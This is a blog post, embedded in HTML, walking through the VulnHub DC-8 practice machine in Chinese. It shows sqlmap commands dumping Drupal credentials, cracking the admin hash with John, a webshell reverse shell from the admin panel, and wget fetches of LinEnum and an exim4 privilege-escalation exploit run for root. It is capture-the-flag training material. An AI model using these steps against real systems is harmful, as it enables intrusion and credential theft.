@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="DC-8Author:Xinggsql注入获取后台账号密码，后台添加webshel，用LinEnum发现存在已知漏洞的组件拿到root">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-8">
+<meta property="og:url" content="http://yoursite.com/2020/03/17/DC-8/index.html">
+<meta property="og:site_name" content="Xingg&#39;s Blog">
+<meta property="og:description" content="DC-8Author:Xinggsql注入获取后台账号密码，后台添加webshel，用LinEnum发现存在已知漏洞的组件拿到root">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105404586.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105430608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105447651.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105458723.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105506956.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105523921.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105539625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020011910555260.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105606158.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105618833.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105624596.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105648276.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105658380.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105714329.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020011910572843.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105739341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105754994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105809113.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105811117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020011910582343.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105841703.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105851902.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105903879.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105911495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105936320.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119105938310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110001481.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110007296.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110015819.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020011911002487.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110034446.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110042173.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110056156.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110106845.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110113449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200119110132307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-03-17T00:27:19.000Z">
+<meta property="article:modified_time" content="2020-03-17T14:23:50.122Z">
+<meta property="article:author" content="Xingg">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200119105404586.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/17/DC-8/"/>
+
+
+
+
+
+  <title>DC-8 | Xingg's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xingg's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/17/DC-8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Xingg">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xingg's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DC-8</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-17T08:27:19+08:00">
+                2020-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA-vulnhub/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机-vulnhub</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><p><strong>Author:Xingg</strong><br>sql注入获取后台账号密码，后台添加webshel，用LinEnum发现存在已知漏洞的组件拿到root</p>
+<a id="more"></a>
+
+<p>靶机下载: <a href="https://www.vulnhub.com/entry/dc-8,367/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-8,367/</a></p>
+<p>环境：<br>    kali：192.168.49.129<br>    靶机：192.168.49.12<br>先arp扫描一下目标靶机的ip地址<br><img src="https://img-blog.csdnimg.cn/20200119105404586.png" alt="在这里插入图片描述"><br>发现192.168.49.12<br>nmap流程走一下  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.49.12 -p- -sV -sT -T5 -A</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105430608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只开放了22和80<br>浏览器打开，发现是一个用Drupal搭的站<br><img src="https://img-blog.csdnimg.cn/20200119105447651.png" alt="在这里插入图片描述"><br>搞框架搭的站，可先试试已经报出来的漏洞，DC-1就是这么进去的，这里提供一个思路，因为没能成功不做演示。<br>左侧的板块，链接存在get传参<br><img src="https://img-blog.csdnimg.cn/20200119105458723.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119105506956.png" alt="在这里插入图片描述"><br><a href="http://192.168.49.12/?nid=1’" target="_blank" rel="noopener">http://192.168.49.12/?nid=1’</a><br>随手加一个单引号’ 报错了<a href="http://192.168.49.12/?nid=1’" target="_blank" rel="noopener">http://192.168.49.12/?nid=1’</a><br><img src="https://img-blog.csdnimg.cn/20200119105523921.png" alt="在这里插入图片描述"><br>应该存在sql注入，上sqlmap  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.49.12&#x2F;?nid&#x3D;1</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105539625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>果然是存在漏洞的，也符合了DC系列的一贯风格，web部分的考点并不很难<br>这个站应该是有后台的  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.49.12 先跑着找一下后台</span><br></pre></td></tr></table></figure>
+<p>然后我们进数据库找一下管理员密码  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.49.12&#x2F;?nid&#x3D;1 –dbs</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2020011910555260.png" alt="在这里插入图片描述">  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.49.12&#x2F;?nid&#x3D;1 -D d7db –tables</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105606158.png" alt="在这里插入图片描述">  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.49.12&#x2F;?nid&#x3D;1 -D d7db -T users –columns</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105618833.png" alt="在这里插入图片描述">  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.49.12&#x2F;?nid&#x3D;1 -D d7db -T users -C name,pass –dump</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105624596.png" alt="在这里插入图片描述"><br>找到了后台管理员的账号和加密过的密码<br>Drupal有自己的加密算法，网上找一找自己写个脚本就能爆破密文了<br>这里推荐一个密码爆破工具John（用户名也叫john应该是个提示）<br>他能根据密文识别出这是Drupal的密码，然后直接调用Drupal的加密算法爆破<br>我们把账号和密文存成文件dc8.pass.txt<br><img src="https://img-blog.csdnimg.cn/20200119105648276.png" alt="在这里插入图片描述">  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john –wordlist&#x3D;passwd.txt dc8.pass.txt</span><br></pre></td></tr></table></figure>
+<p>–wordlist是字典，不加这个参数会使用john的默认字典<br><img src="https://img-blog.csdnimg.cn/20200119105658380.png" alt="在这里插入图片描述"><br>如果是第一次运行 则能够跑出john用户的密码是turtle<br>但是因为我之前跑出来以后，john已经把密文和对应的明文存入了缓存，再次遇到则不会再爆破<br>如 dc8pass.txt内只有<br><code>john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</code><br>运行则会遇到No password hashes left to crack (see FAQ)<br><img src="https://img-blog.csdnimg.cn/20200119105714329.png" alt="在这里插入图片描述"><br>我找了好多国内的博客论坛，都没有提到如何解决这个问题，最后在某国外论坛上看到某个老哥也遇到了同样的问题 使用了—show参数，直接查看已经爆破出来的密码<br><img src="https://img-blog.csdnimg.cn/2020011910572843.png" alt="在这里插入图片描述"><br>（如果没有注意到john这个细节，则会在前后两次爆破同一个弱密码时，错过第二次的弱密码）<br>成功拿到账号密码john:turtle<br>查看刚才dirb跑出来的后台 192.168.49.12/user 进入后台<br><img src="https://img-blog.csdnimg.cn/20200119105739341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找了好久 还是终于在Contact Us界面找到了写shell的地方<br><img src="https://img-blog.csdnimg.cn/20200119105754994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>save之后 回到VIEW界面<br><img src="https://img-blog.csdnimg.cn/20200119105809113.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119105811117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时要先回到kali监听7777端口<br><img src="https://img-blog.csdnimg.cn/2020011910582343.png" alt="在这里插入图片描述"><br>再点Submit<br>回到kali 已经连上了  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;);&quot; &#x2F;&#x2F;获取交互式shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105841703.png" alt="在这里插入图片描述"><br>已经拿到www的shell 下一步是提权<br>查看系统版本和内核版本  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname –a   </span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105851902.png" alt="在这里插入图片描述"><br>Debian 9.1版本太高了暂时还没有可以利用的提权脚本<br><img src="https://img-blog.csdnimg.cn/20200119105903879.png" alt="在这里插入图片描述">  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo –l</span><br></pre></td></tr></table></figure>
+<p> 查看一下有没有给www可以用的sudo命令<br><img src="https://img-blog.csdnimg.cn/20200119105911495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结果他让我输入三次密码，那就没有可用sudo命令<br>传一个LinEnum.sh上去试试<br>在kali 启一个简易的http服务  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+<p>另一边wget下载就行了，但是一定要在有写权限的目录下，这里我选择了/var/tmp<br><img src="https://img-blog.csdnimg.cn/20200119105936320.png" alt="在这里插入图片描述"><br>加上执行权限chmod 777 LinEnum.sh  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F; LinEnum.sh运行</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200119105938310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实在没有思路就查看一下这些文件版本查一下有无漏洞 毕竟sudo都爆出漏洞了<br><img src="https://img-blog.csdnimg.cn/20200119110001481.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119110007296.png" alt="在这里插入图片描述"><br>正好发现了exim4 存在本地提权漏洞<br>我们查看这个漏洞的更多信息<br><img src="https://img-blog.csdnimg.cn/20200119110015819.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020011911002487.png" alt="在这里插入图片描述"><br>去到漏洞库<br>找到下载提权脚本的url<br><a href="https://www.exploit-db.com/download/46996" target="_blank" rel="noopener">https://www.exploit-db.com/download/46996</a><br>给出了两种使用脚本的方法<br>setuid：<br><img src="https://img-blog.csdnimg.cn/20200119110034446.png" alt="在这里插入图片描述"><br>netcat：<br><img src="https://img-blog.csdnimg.cn/20200119110042173.png" alt="在这里插入图片描述"><br>去到靶机上 wget <a href="https://www.exploit-db.com/download/46996" target="_blank" rel="noopener">https://www.exploit-db.com/download/46996</a><br>加上权限执行<br><img src="https://img-blog.csdnimg.cn/20200119110056156.png" alt="在这里插入图片描述"><br>报错了，因为window上写的脚本到linux上格式不同<br>先把及脚本下载到本地，使用dos2unix命令修改文件格式<br><img src="https://img-blog.csdnimg.cn/20200119110106845.png" alt="在这里插入图片描述"><br>再把文件上传到靶机上<br>运行<br><img src="https://img-blog.csdnimg.cn/20200119110113449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200119110132307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjEyODYxNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提权成功<br>欢迎师傅们指点</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/17/DC-7/" rel="next" title="DC-7">
+                <i class="fa fa-chevron-left"></i> DC-7
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Xingg</p>
+              <p class="site-description motion-element" itemprop="description">记录一个网安民工日常迷惑操作</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-8"><span class="nav-number">1.</span> <span class="nav-text">DC-8</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xingg</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
